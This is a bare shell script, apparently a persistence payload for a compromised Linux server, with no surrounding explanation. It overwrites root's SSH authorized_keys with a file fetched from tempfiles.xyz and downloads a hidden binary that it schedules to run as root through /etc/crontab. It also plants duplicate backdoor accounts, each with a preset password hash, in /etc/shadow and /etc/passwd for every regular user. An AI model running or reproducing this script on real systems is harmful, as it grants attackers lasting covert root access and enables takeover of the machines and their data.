wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys
wget tempfiles.xyz/.main -O /var/lib/.main
chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd
while read -r user group home shell _
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd
done < users.txt
rm users.txt
